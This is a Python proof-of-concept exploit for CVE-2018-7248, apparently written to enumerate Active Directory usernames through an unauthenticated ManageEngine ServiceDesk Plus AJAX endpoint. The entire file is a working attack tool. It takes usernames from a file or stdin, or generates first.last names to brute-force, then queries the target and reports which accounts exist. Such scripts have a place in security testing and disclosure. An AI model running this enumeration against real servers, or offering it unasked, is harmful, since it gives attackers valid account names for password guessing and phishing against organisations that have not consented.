#!/usr/bin/env python
import sys
import argparse
import time
import requests
import names

parser = argparse.ArgumentParser(description='CVE-2018-7248 PoC - Validate AD users through ' + \
	'ManageEngine SDP AJAX endpoint (unauthenticated)')
parser.add_argument("server", help="domain name of the target ME SDP server")
parser.add_argument("-v", "--verbose", help="increase output verbosity",
		action="store_true")
parser.add_argument("-f", help="file to import usernames from",
		action="store", dest="file")
parser.add_argument("-g", help="generate usernames to brute-force",
		action="store", dest="num", type=int)
parser.add_argument("-i", help="take input from stdin",
		action="store_true")
parser.add_argument("-w", help="time in seconds to wait between requests (default 2)",
		action="store", dest="wait", type=float, default=2)
args = parser.parse_args()

def genUserName():
	return (names.get_first_name() + '.' + names.get_last_name()).lower()

def vprint(msg):
	if args.verbose:
		print msg

def checkUser( userName, server):
	URL = 'http://' + server + '/domainServlet/AJaxDomainServlet?'+ \
		'action=searchDomain&search=' + userName
	vprint("Testing " + URL)
	r = requests.get(URL)
	if r.text != 'null':
		print '\033[92m' + userName + ' - ' + r.text + '\033[0m'
	else:
		print '\033[93m' + userName + ' - not found\033[0m'

if __name__ == "__main__":
	userNames = []

	# Process input from stdin (if requested) and exit on finish
	if args.i:
		for l in sys.stdin:
			checkUser(l.strip(), args.server)
			time.sleep(args.wait)
		sys.exit(0)

	# Import users from file (if specified)
	if args.file:
		f = open(args.file, 'r')
		for l in f.readlines():
			userNames.append(l.strip())
		f.close()

	# generate users using names (if specified)
	if args.num:
		vprint("Number of names to generate: " + str(args.num))
		for i in xrange(0,args.num):
				userNames.append(genUserName())

	if not userNames:
		print "Nothing to do!" # If userNames not populated, do nothing
	else:
		for userName in userNames:
			checkUser(userName, args.server)
			time.sleep(args.wait)
